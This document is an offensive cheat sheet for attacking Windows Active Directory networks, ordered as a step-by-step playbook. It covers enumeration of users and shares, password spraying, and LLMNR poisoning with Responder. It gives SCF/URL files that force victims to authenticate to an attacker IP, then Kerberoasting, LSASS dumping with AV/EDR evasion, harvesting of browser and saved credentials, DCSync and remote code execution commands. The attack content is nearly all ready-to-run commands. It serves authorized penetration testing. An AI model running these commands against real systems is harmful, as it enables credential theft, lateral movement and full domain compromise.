Windows Enumeration - Cheat Sheet

Enumerate a Windows / Active Directory environment from an attacker machine.
The main goal: find users → get their credentials → use them to move.
Ordered by effectiveness — best options first in each section.
Replace the placeholders (<...>) with your own values.


════════════════════════════════════════════════════════════════════
PART 1 — UNAUTHENTICATED ENUMERATION
════════════════════════════════════════════════════════════════════

── Host & Service Discovery ─────────────────────────────────────────

Ping sweep — find live hosts before anything else:

    nmap -sn <target-range>

    Common target formats:
      192.168.50.0/24    entire subnet
      192.168.50.1-50    IP range
      192.168.50.10      single host

Quick port scan across the full range:

    nmap -Pn --top-ports=100 -oA top100 <target-range>

    -Pn          skip ping (treat all as up — use when ICMP is blocked)
    --top-ports  scan the N most commonly open ports
    -oA          save in all three formats (.nmap, .xml, .gnmap)

Full service scan — run only against confirmed live hosts:

    nmap -Pn -sCV -oA <output-name> -iL hosts_ips.txt -v

    -sC   run default NSE scripts
    -sV   detect service versions
    -iL   read targets from a file (one IP per line)
    -v    verbose — shows results as they arrive


── OS Fingerprinting ────────────────────────────────────────────────

    nmap -Pn -O -sV -iL hosts_ips.txt

    -O   OS fingerprinting (requires root / sudo)
    Combine with -sV to get service versions in the same run.


── DC Discovery ─────────────────────────────────────────────────────

Find all domain controllers via DNS — no credentials needed:

    nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>

Zone transfer attempt (usually blocked, always worth trying):

    dig axfr <domain> @<dns-server-ip>


── SMB Fingerprinting ───────────────────────────────────────────────

Grab domain name, OS, signing status, and DC hostnames in one shot:

    nxc smb <target-range>

    Key things to look for:
      Domain / Hostname   confirms domain name and DC candidates
      OS version          identifies unpatched or legacy systems
      Signing: False      SMB signing is OFF — relay attack target
      (Guest OK)          guest auth is enabled — try anonymous share listing


── Null Session / General Enumeration ───────────────────────────────

All-in-one unauthenticated recon — try this first on every SMB host:

    enum4linux-ng -A <target>

    When null sessions are allowed, pulls without credentials:
      domain info, user list, group list, share list, password policy

Manual RPC null session (when enum4linux-ng is not available):

    rpcclient -U "" -N <target>

    Useful commands once connected:
      srvinfo           OS info and server type
      enumdomusers      list all domain users
      enumdomgroups     list all domain groups
      querydominfo      min password length, lockout policy
      querydispinfo     user list with descriptions
      lsaquery          local security authority info


── User Enumeration (no creds) ──────────────────────────────────────

Ordered by reliability — try from top to bottom.

1. RID cycling (best — doesn't need a wordlist, finds ALL accounts):

    nxc smb <dc-ip> -u '' -p '' --rid-brute
    nxc smb <dc-ip> -u 'guest' -p '' --rid-brute
    lookupsid.py <domain>/''@<dc-ip> -no-pass
    lookupsid.py <domain>/guest@<dc-ip> -no-pass

    Brute-forces RIDs (500-4000+) — finds every user and group.
    Works even when enumdomusers is blocked.
    No wordlist needed — this should be your first try.

2. Kerbrute (silent — no failed-logon events generated):

    kerbrute userenum --dc <dc-ip> -d <domain> <users.txt>

    Useful flags:
      -t 50        threads (default 10)
      -o <file>    save valid usernames to a file
      --downgrade  force RC4 (useful against older DCs)

    Invisible to most SIEMs (no event 4625). Needs a wordlist.

3. enum4linux-ng (already listed above — covers users too):

    enum4linux-ng -A <target>

4. rpcclient null session:

    rpcclient -U "" -N <target>  →  enumdomusers

5. windapsearch (only works if anonymous LDAP bind is enabled):

    windapsearch -d <domain> --dc <dc-ip> -U          # all users
    windapsearch -d <domain> --dc <dc-ip> -G          # all groups
    windapsearch -d <domain> --dc <dc-ip> -PU         # privileged users
    windapsearch -d <domain> --dc <dc-ip> --da        # domain admins

6. LDAP anonymous bind (raw query):

    ldapsearch -x -H ldap://<dc-ip> -b "DC=<domain>,DC=<tld>" \
        "(objectClass=user)" sAMAccountName

7. nmap Kerberos script (slowest, last resort):

    nmap -p 88 --script=krb5-enum-users \
        --script-args="krb5-enum-users.realm='<domain>',userdb=<users.txt>" \
        <dc-ip>

How to build users.txt (when you need a wordlist):
  Generate first.last / f.last / flast combos from LinkedIn, a company
  website, or any public employee directory.
  Tools: linkedin2username, namemash.py, cewl (scrape company site)


── Share Enumeration ────────────────────────────────────────────────

Anonymous / guest share listing:

    nxc smb <target> -u '' -p '' --shares
    nxc smb <target> -u 'guest' -p '' --shares

Browse a share directly:

    smbclient //<target>/<share-name> -N

    READ or WRITE on non-default shares is a high-value finding.
    WRITE access? → drop an SCF/URL file to steal hashes (see Part 3).
    IPC$ with guest access allows null-session RPC.


════════════════════════════════════════════════════════════════════
PART 2 — AUTHENTICATED ENUMERATION (find more users)
════════════════════════════════════════════════════════════════════

Any nxc command using -p <password> can use -H <NT-hash> instead
for pass-the-hash without knowing the plaintext password.

Ordered by how much useful info they give you.


── Credential Verification ─────────────────────────────────────────

Verify a single credential:

    nxc smb <target> -u <username> -p <password>
    nxc smb <target> -u <username> -p <password> --shares

    [+]       auth succeeded
    (Pwn3d!)  user has local admin on that host

Check against multiple protocols (find what's open):

    nxc smb <target> -u <user> -p <pass>
    nxc winrm <target> -u <user> -p <pass>
    nxc rdp <target> -u <user> -p <pass>
    nxc mssql <target> -u <user> -p <pass>
    nxc ldap <target> -u <user> -p <pass>


── AD Attack Path Mapping ────────────────────────────────────────────

BloodHound maps the entire AD and finds privilege escalation paths
visually. Run this the moment you have any domain credential.

From Linux (no foothold needed):

    bloodhound-python -u <user> -p <pass> -d <domain> \
        -dc <dc-fqdn> -c all --zip

From a Windows host (SharpHound):

    SharpHound.exe -c all --zipfilename bloodhound.zip

    Needs AMSI bypass if Defender is active.

Import the .zip into BloodHound GUI. Key built-in queries:
  Shortest Paths to Domain Admins
  Find All Domain Admins
  Find Principals with DCSync Rights
  Kerberoastable Users with Paths to DA
  Find Computers where DA is Logged On
  Find Computers with Unsupported OS
  Shortest Paths from Owned Principals


── User Enumeration (with creds) ────────────────────────────────────

Ordered by how much info you get.

1. ldapdomaindump (full dump — best for browsing everything):

    ldapdomaindump -u '<domain>\<user>' -p <pass> <dc-ip> -o <output-dir>

    Produces: domain_users.html, domain_groups.html, domain_computers.html,
              domain_trusts.html, domain_policy.html
    Open in a browser for a clean, sortable view of the entire domain.

2. NetExec (quick, scriptable):

    nxc ldap <dc-ip> -u <user> -p <pass> --users             # all users via LDAP
    nxc smb <dc-ip> -u <user> -p <pass> --users              # all users via SMB
    nxc smb <dc-ip> -u <user> -p <pass> --rid-brute          # RID cycling
    nxc ldap <dc-ip> -u <user> -p <pass> --active-users      # only enabled accounts

3. Impacket GetADUsers (detailed — last logon, UAC flags, etc.):

    GetADUsers.py <domain>/<user>:<pass> -dc-ip <dc-ip> -all

4. ADRecon (PowerShell — massive all-in-one AD dump):

    .\ADRecon.ps1 -OutputType CSV

    Dumps: users, groups, OUs, GPOs, ACLs, trusts, LAPS, DNS,
    computers, printers — everything into structured CSV/Excel.
    Needs AMSI bypass if Defender is on.

5. windapsearch (targeted LDAP queries):

    windapsearch -d <domain> --dc <dc-ip> -u <user>@<domain> -p <pass> -U
    windapsearch -d <domain> --dc <dc-ip> -u <user>@<domain> -p <pass> --da
    windapsearch -d <domain> --dc <dc-ip> -u <user>@<domain> -p <pass> -PU
    windapsearch -d <domain> --dc <dc-ip> -u <user>@<domain> -p <pass> -S   # find SPNs

6. PowerView (from a Windows foothold, needs AMSI bypass if Defender):

    Get-DomainUser                             # all users
    Get-DomainUser -SPN                        # kerberoastable accounts
    Get-DomainUser -PreauthNotRequired         # asrep-roastable accounts
    Get-DomainUser -AdminCount                 # admin-flagged users
    Get-DomainUser -Properties description     # descriptions (often have passwords)
    Get-DomainUser -TrustedToAuth              # constrained delegation accounts
    Find-DomainUserLocation                    # where users are logged in
    Get-DomainComputer -Unconstrained          # unconstrained delegation hosts
    Get-DomainObjectAcl -Identity <user> -ResolveGUIDs  # ACLs on a user

7. From a Windows foothold (net commands — no tools needed):

    net user /domain                           # list all domain users
    net user <username> /domain                # details on one user
    net group /domain                          # list all domain groups
    net group "Domain Admins" /domain          # members of a group
    net accounts /domain                       # password policy
    nltest /dclist:<domain>                    # list all DCs
    nltest /domain_trusts                      # list domain trusts

8. ldapsearch (raw LDAP queries — most flexible, most verbose):

    ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w <pass> \
        -b "DC=<domain>,DC=<tld>" "(objectClass=user)" \
        sAMAccountName description memberOf

    Find service accounts:
    ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w <pass> \
        -b "DC=<domain>,DC=<tld>" "(servicePrincipalName=*)" \
        sAMAccountName servicePrincipalName


── Group Enumeration ─────────────────────────────────────────────────

    nxc smb <dc-ip> -u <user> -p <pass> --groups

    Priority groups to find members of:
      Domain Admins, Enterprise Admins, Backup Operators,
      Account Operators, Server Operators, DNSAdmins,
      Schema Admins, Group Policy Creator Owners,
      Remote Desktop Users, Remote Management Users

From a Windows foothold:

    net group "Domain Admins" /domain
    net localgroup Administrators              # on current host
    Get-DomainGroupMember "Domain Admins"      # PowerView


── Computer Enumeration ──────────────────────────────────────────────

    nxc ldap <dc-ip> -u <user> -p <pass> --computers

Find hosts where your user is local admin:

    nxc smb <targets-file> -u <user> -p <pass>
    Look for (Pwn3d!) in the output — those are your admin boxes.

Find hosts where specific users are logged in:

    nxc smb <targets-file> -u <user> -p <pass> --loggedon-users


── Share Enumeration & Spidering ────────────────────────────────────

List all accessible shares:

    nxc smb <target> -u <user> -p <pass> --shares

Crawl shares recursively for sensitive files:

    nxc smb <target> -u <user> -p <pass> --spider-shares

    Looks for: passwords.txt, config files, scripts with hardcoded creds,
    backup files, web.config, id_rsa, .kdbx, and more.

Snaffler (best share hunter — classifies findings by severity):

    Snaffler.exe -s -o snaffler.log

    Run from a domain-joined Windows host. Finds passwords in scripts,
    config files, certificates, KeePass DBs, and more across all
    readable shares automatically.

Browse a share manually:

    smbclient //<target>/<share-name> -U <user>%<pass>


── Password Policy ───────────────────────────────────────────────────

Check BEFORE any spray or brute-force attempt:

    nxc smb <dc-ip> -u <username> -p <password> --pass-pol

    Key fields:
      Lockout threshold    bad attempts before lockout
      Observation window   how long until the counter resets
      Lockout duration     how long an account stays locked
      Min password length  useful for building smarter wordlists

    Rule: spray at most (threshold - 1) attempts per observation window.


── ADCS Enumeration ──────────────────────────────────────────────────

Find misconfigured certificate templates (ESC1–ESC11):

    certipy find -u <user>@<domain> -p <pass> -dc-ip <dc-ip> -vulnerable

    Output: a text report + JSON with all vulnerable templates.
    This is often the fastest path to DA in modern environments.

    nxc ldap <dc-ip> -u <user> -p <pass> -M adcs
    Finds Certificate Authorities and their templates.


════════════════════════════════════════════════════════════════════
PART 3 — GET CREDENTIALS (the main goal)
════════════════════════════════════════════════════════════════════

Everything below is about getting a user's password, hash, or ticket.
Organized by what access level you need — ordered best to worst.

Two types of hashes you'll encounter:
  NT hash (NTLM)      → pass-the-hash directly, crack with hashcat -m 1000
  Net-NTLMv2 (NTLMv2) → CANNOT pass-the-hash, must crack or relay
                         crack with hashcat -m 5600


── 3A: No Credentials Needed ───────────────────────────────────────

These work with zero domain creds — just network position.

1. LLMNR / NBT-NS Poisoning — Responder (passive — just listen):

    responder -I <interface> -dwPv

    Sits on the network and waits. When a user mistypes a hostname or
    a share path, their machine broadcasts it. Responder answers and
    captures their Net-NTLMv2 hash.

    Crack the captured hash:
      hashcat -m 5600 <hash-file> <wordlist>

    Or relay it instead of cracking (see relay attacks cheatsheet).
    This is often the first credential you get on an internal pentest.

2. AS-REP Roasting (only needs valid usernames):

    GetNPUsers.py <domain>/ -dc-ip <dc-ip> -usersfile <users.txt> -no-pass
    GetNPUsers.py <domain>/<user>:<pass> -dc-ip <dc-ip> -request

    Targets accounts with "Do not require Kerberos pre-auth" set.
    Returns a crackable hash even without creds.
    Crack: hashcat -m 18200 <hash-file> <wordlist>

3. SCF / URL / LNK file in a writable share (force NTLM auth):

    If you found a writable share, drop one of these to steal hashes
    from anyone who browses that share:

    SCF file (icon lookup forces SMB auth):
      Create file: anything.scf
      [Shell]
      Command=2
      IconFile=\\<attacker-ip>\share\icon.ico

    URL file:
      Create file: anything.url
      [InternetShortcut]
      URL=file://<attacker-ip>/share
      IconFile=\\<attacker-ip>\share\icon.ico
      IconIndex=0

    Start Responder or smbserver before dropping the file:
      responder -I <interface> -dwPv
      smbserver.py share /tmp -smb2support

    Captures Net-NTLMv2 hashes of every user who opens the folder.

4. mitm6 + relay (IPv6 DNS takeover):

    mitm6 -d <domain>

    Combined with ntlmrelayx to relay captured auth.
    See mitm6 cheatsheet for full setup.

5. Password spraying (without initial creds — use with kerbrute):

    kerbrute passwordspray --dc <dc-ip> -d <domain> <users.txt> <password>

    Common first-spray passwords:
      Season+Year (Summer2026, Winter2025)
      Company+123, Welcome1, Password1, <company-name>+1
    Always check pass-pol first if you can (null session / enum4linux).


── 3B: Domain User Creds (no admin needed) ─────────────────────────

You have a valid domain user. These are your quick wins — check all
of them before doing anything noisy.

1. Kerberoasting (any domain user can do this — best single attack):

    GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc-ip> -request
    nxc ldap <dc-ip> -u <user> -p <pass> --kerberoasting

    From Windows:
      Rubeus.exe kerberoast /outfile:hashes.txt

    Targets any account with an SPN set. Service accounts often have
    weak passwords. Crack offline — no lockout risk.
    Crack: hashcat -m 13100 <hash-file> <wordlist>

    Targeted Kerberoasting (if you have GenericAll/GenericWrite on a user):
      Set an SPN on them, roast, then remove the SPN:
      targetedKerberoast.py -u <user> -p <pass> -d <domain> --dc-ip <dc-ip>

2. Passwords in user descriptions (instant — no cracking needed):

    nxc ldap <dc-ip> -u <user> -p <pass> -M get-desc-users

    Admins constantly put "temp password" or initial passwords in
    the description field. Hits more often than you'd expect.

3. GPP passwords (Group Policy Preferences — instant decrypt):

    nxc smb <dc-ip> -u <user> -p <pass> -M gpp_password

    GPP stored encrypted passwords in SYSVOL — MS published the key.
    Patched (MS14-025) but old GPP files remain forever.
    Also manually check: \\<domain>\SYSVOL\<domain>\Policies\ for
    Groups.xml, Services.xml, Scheduledtasks.xml, Datasources.xml

4. LAPS passwords (instant local admin password):

    nxc ldap <dc-ip> -u <user> -p <pass> --laps

    Reads the ms-Mcs-AdmPwd attribute (LAPS v1) or
    msLAPS-Password (LAPS v2) from computer objects.
    Only works if your user has read rights — but misconfigured ACLs
    are extremely common. Always try.

5. gMSA passwords (managed service account — often high-priv):

    nxc ldap <dc-ip> -u <user> -p <pass> --gmsa
    gMSADumper.py -u <user> -p <pass> -d <domain>

    Readable by principals in msDS-GroupMSAMembership.
    gMSA accounts frequently run services as local admin or higher.

6. ADCS certificate abuse (often fastest path to DA):

    certipy find -u <user>@<domain> -p <pass> -dc-ip <dc-ip> -vulnerable
    certipy req -u <user>@<domain> -p <pass> -ca <ca-name> \
        -template <vuln-template> -upn administrator@<domain>

    ESC1: request cert as any user (instant DA if template is vulnerable)
    See ADCS ESC attacks cheatsheet for ESC1–ESC11.

7. AS-REP Roasting (with creds — finds all vulnerable accounts):

    GetNPUsers.py <domain>/<user>:<pass> -dc-ip <dc-ip> -request

    With creds you can query LDAP for all accounts with pre-auth
    disabled — no wordlist needed.

8. Password spraying (authenticated — faster, more targeted):

    nxc smb <target-range> -u <users-file> -p <password> --continue-on-success
    nxc smb <target-range> -u <user> -p <passwords-file>

    Spray via Kerberos (stealthier — event 4771 not 4625):
      kerbrute passwordspray --dc <dc-ip> -d <domain> <users.txt> <password>

    Always check password policy first:
      nxc smb <dc-ip> -u <user> -p <pass> --pass-pol

9. Share hunting (scripts, configs, KeePass, SSH keys):

    nxc smb <target> -u <user> -p <pass> --spider-shares
    Snaffler.exe -s -o snaffler.log                            # from Windows

    Common finds:
      web.config / appsettings.json with connection strings
      PowerShell scripts with hardcoded creds
      batch files with passwords
      *.kdbx (KeePass), *.pfx (certs), id_rsa (SSH keys)
      backup files, database exports

10. BloodHound ACL abuse paths:

    Look for these in BloodHound — they lead to cred theft:
      GenericAll on a user      → reset their password / set SPN / kerberoast
      GenericWrite on a user    → targeted kerberoast / shadow creds
      ForceChangePassword       → change their password directly
      WriteDACL                 → grant yourself GenericAll, then above
      WriteOwner                → take ownership, then WriteDACL, then above
      AddMember                 → add yourself to a privileged group
      ReadLAPSPassword          → read LAPS (same as --laps)
      ReadGMSAPassword          → read gMSA (same as --gmsa)

11. MSSQL credential hunting (if port 1433 is open):

    nxc mssql <target> -u <user> -p <pass> -q "SELECT * FROM master..syslogins"
    nxc mssql <target> -u <user> -p <pass> --get-hash         # steal service account hash

    Check for linked servers (pivot to other SQL instances):
      nxc mssql <target> -u <user> -p <pass> -q "EXEC sp_linkedservers"
      xp_cmdshell for code exec if enabled or you can enable it.

12. Coercion + Relay (force a machine to auth to you):

    PetitPotam, PrinterBug, DFSCoerce — coerce a DC or high-value
    server to authenticate to your relay.
    See authentication-coercion and ntlm-relay cheatsheets.


── 3C: Local Admin on a Host ───────────────────────────────────────

You have local admin on at least one machine. Dump everything.
Ordered by what gives you the most creds with least detection.

1. secretsdump.py (all-in-one — best single command from Linux):

    secretsdump.py <domain>/<user>:<pass>@<target>
    secretsdump.py <domain>/<user>@<target> -hashes :<NT-hash>

    Pulls SAM + LSA + cached domain creds in one shot.
    If target is a DC, also pulls NTDS.dit (every domain hash).

2. nxc modules — lsassy (remote LSASS — in-memory, stealthiest):

    nxc smb <target> -u <user> -p <pass> -M lsassy

    Dumps LSASS remotely without dropping files to disk.
    Returns: NTLM hashes, Kerberos tickets, sometimes plaintext passwords.

3. nxc SAM + LSA (quick, reliable):

    nxc smb <target> -u <user> -p <pass> --sam               # local account hashes
    nxc smb <target> -u <user> -p <pass> --lsa               # cached domain creds + service passwords

4. nxc modules — nanodump (AV evasion via direct syscalls):

    nxc smb <target> -u <user> -p <pass> -M nanodump

    Uses direct syscalls to dump LSASS — bypasses most AV/EDR.
    Better than procdump when Defender is active.

5. nxc modules — other LSASS options:

    nxc smb <target> -u <user> -p <pass> -M handlekatz       # in-memory via handle dup
    nxc smb <target> -u <user> -p <pass> -M procdump         # uses procdump.exe (noisy)

6. comsvcs.dll MiniDump (LOLBin — no tools needed on target):

    From a Windows foothold with admin:
      tasklist /fi "imagename eq lsass.exe"                   # get LSASS PID
      rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <pid> C:\temp\out.dmp full

    Then exfil the dump and parse offline:
      pypykatz lsa minidump out.dmp

    Uses a built-in Windows DLL — nothing to upload.

7. Mimikatz (classic — needs AMSI bypass if Defender is on):

    privilege::debug
    sekurlsa::logonpasswords                    # dump all creds from LSASS
    sekurlsa::ekeys                             # encryption keys (AES + RC4)
    sekurlsa::tickets /export                   # export all Kerberos tickets
    sekurlsa::dpapi                             # DPAPI masterkeys
    lsadump::sam                                # SAM database
    lsadump::lsa /patch                         # LSA secrets
    lsadump::cache                              # cached domain creds (DCC2)
    vault::cred                                 # Windows Credential Manager
    vault::list                                 # Windows Vault

    Via C2 (no AMSI bypass needed):
      execute-assembly Mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"

8. Rubeus (Kerberos ticket harvesting):

    Rubeus.exe triage                            # list all tickets in all sessions
    Rubeus.exe dump                              # dump all tickets
    Rubeus.exe harvest /interval:30              # auto-harvest TGTs every 30 sec
    Rubeus.exe tgtdeleg                          # get usable TGT via delegation trick
    Rubeus.exe monitor /interval:5 /filteruser:DA-USER  # watch for DA logons

    Needs AMSI bypass if running directly on host.

9. Token impersonation (steal logged-in user's token):

    From Windows (Incognito via Meterpreter):
      list_tokens -u                             # list available tokens
      impersonate_token "<domain>\<user>"         # impersonate

    From C2: token stealing is usually built in (Sliver, Cobalt Strike).

    If a DA is logged into a box where you're admin, steal their token
    and you're DA without cracking anything.

10. pypykatz (parse LSASS dumps offline):

    pypykatz lsa minidump <lsass.dmp>

    Use when you exfil a dump file and parse on your attack box.

11. DPAPI decryption (browser passwords, Credential Manager, etc.):

    From Mimikatz:
      dpapi::cred /in:C:\Users\<user>\AppData\...\Credentials\<guid>
      dpapi::masterkey /in:<masterkey-file> /rpc   # decrypt via DC (needs DA)

    From Impacket (remote):
      dpapi.py credential -file <cred-file> -key <masterkey>

    SharpDPAPI.exe triage                        # auto-find and decrypt everything


── 3D: Credential Hunting on a Host (local access) ────────────────

You have a shell on a host. Search for stored/saved passwords.
Many of these don't need admin.

1. LaZagne (all-in-one — best single tool):

    LaZagne.exe all

    Pulls from: browsers (Chrome, Firefox, Edge, IE), wifi, sysadmin
    tools (FileZilla, WinSCP, PuTTY, RDP), databases, mail clients,
    git, memory, Windows Vault, DPAPI blobs, and more.

2. Saved credentials (Credential Manager):

    cmdkey /list                                 # list saved creds
    If entries exist:
      runas /savecred /user:<domain>\<user> cmd.exe

    From PowerShell:
      Get-ChildItem C:\Users\*\AppData\Local\Microsoft\Credentials\
      Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Credentials\

3. Browser saved passwords:

    SharpChromium.exe logins                     # Chrome/Edge
    SharpWeb.exe all                             # all browsers

    Manual locations:
      Chrome: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
      Edge:   %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data
      Firefox: %APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json

4. PuTTY saved sessions (may have proxy passwords):

    reg query "HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions" /s

5. WinSCP saved passwords:

    reg query "HKCU\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions" /s

6. FileZilla saved passwords:

    type %APPDATA%\FileZilla\recentservers.xml
    type %APPDATA%\FileZilla\sitemanager.xml

7. RDP saved connections:

    reg query "HKCU\SOFTWARE\Microsoft\Terminal Server Client\Servers" /s
    dir %LOCALAPPDATA%\Microsoft\Remote Desktop Connection Manager\

8. Autologon credentials (registry):

    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" \
        /v DefaultUserName
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" \
        /v DefaultPassword
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" \
        /v AutoAdminLogon

9. Wifi passwords:

    nxc smb <target> -u <user> -p <pass> -M wireless         # remote (admin)
    netsh wlan show profiles                                  # local
    netsh wlan show profile name="<wifi>" key=clear           # show password

10. Unattend / sysprep files (deployment leftovers):

    Check these paths for cleartext or base64 passwords:
      C:\unattend.xml
      C:\Windows\Panther\unattend.xml
      C:\Windows\Panther\Unattend\Unattend.xml
      C:\Windows\system32\sysprep\sysprep.xml
      C:\Windows\system32\sysprep\Unattend.xml

11. IIS / web.config / connection strings:

    type C:\inetpub\wwwroot\web.config
    type C:\inetpub\wwwroot\appsettings.json

    Look for connectionStrings, password=, pwd=, key=, secret=

12. PowerShell history:

    type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

    Users sometimes type passwords in PowerShell commands.

13. KeePass databases:

    Search for *.kdbx across the host and shares.
    Crack the master password:
      keepass2john <file.kdbx> > keepass.hash
      hashcat -m 13400 keepass.hash <wordlist>

    KeePass 2.x CVE-2023-32784: dump master password from memory:
      dotnet KeePwn.dll -d <keepass.dmp>

14. Windows Vault / Credential Manager (via PowerShell):

    [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
    (New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll()


── 3E: Domain Admin / DCSync ───────────────────────────────────────

You have DA or DCSync rights. Dump the entire domain.

    nxc smb <dc-ip> -u <user> -p <pass> --ntds
    secretsdump.py <domain>/<user>:<pass>@<dc-ip>
    secretsdump.py <domain>/<user>:<pass>@<dc-ip> -just-dc-user administrator
    secretsdump.py <domain>/<user>:<pass>@<dc-ip> -just-dc-user krbtgt

    This gives you EVERY hash in the domain including krbtgt.
    krbtgt hash → Golden Ticket → permanent domain access.


── Code Execution Methods ──────────────────────────────────────────

Requires local admin on the target. Ordered by stealth.

    nxc smb <target> -u <user> -p <pass> -x "<command>"        # CMD via SMB
    nxc smb <target> -u <user> -p <pass> -X "<ps-command>"     # PowerShell via SMB
    nxc winrm <target> -u <user> -p <pass> -X "<ps-command>"   # WinRM (stealthier)
    wmiexec.py <domain>/<user>:<pass>@<target>                  # WMI (semi-interactive)
    atexec.py <domain>/<user>:<pass>@<target> "<command>"       # scheduled task
    dcomexec.py <domain>/<user>:<pass>@<target> "<command>"     # DCOM
    smbexec.py <domain>/<user>:<pass>@<target>                  # SMB service
    psexec.py <domain>/<user>:<pass>@<target>                   # psexec-style (noisiest)


════════════════════════════════════════════════════════════════════
RECOMMENDED WORKFLOW
════════════════════════════════════════════════════════════════════

Unauthenticated — get your first credential:
  1. nmap sweep → nxc smb <range> (domain name, signing, OS)
  2. nslookup SRV → find DCs
  3. enum4linux-ng -A <dc> (null session recon)
  4. RID brute: nxc smb <dc> -u '' -p '' --rid-brute
  5. kerbrute userenum (if RID brute failed)
  6. Start Responder — leave it running (passive hash capture)
  7. AS-REP roast against discovered usernames
  8. Anonymous share listing → writable share? drop SCF file
  9. Password spray: Season+Year, Company+1

Authenticated — escalate to more/better creds:
  1. bloodhound-python → map attack paths
  2. Kerberoast: GetUserSPNs.py → crack offline
  3. Quick wins: descriptions, GPP, LAPS, gMSA
  4. certipy find -vulnerable (ADCS misconfigs)
  5. Spider shares / Snaffler
  6. Spray with known patterns
  7. Check ACL abuse paths in BloodHound

Local admin — dump everything:
  1. secretsdump.py (SAM + LSA + NTDS if DC)
  2. nxc -M lsassy (remote LSASS, stealthy)
  3. LaZagne / cred hunting on each host
  4. Check for logged-in DA tokens
  5. DCSync when you reach DA

Key ideas:
- Responder should be running from minute one — passive cred capture.
- RID brute > kerbrute when you don't have a good wordlist.
- Kerberoasting is the single best authenticated attack — always do it.
- Check descriptions, LAPS, gMSA, and GPP before anything noisy — free creds.
- certipy find is often the fastest path to DA in modern environments.
- lsassy > procdump — in-memory, no file drop, less detection.
- comsvcs.dll MiniDump when you can't upload tools (LOLBin).
- Don't forget PowerShell history and saved browser/RDP/PuTTY creds.
- SMB Signing: False + valid creds = relay attack opportunity.
  See the SMB-relay cheatsheet for next steps.
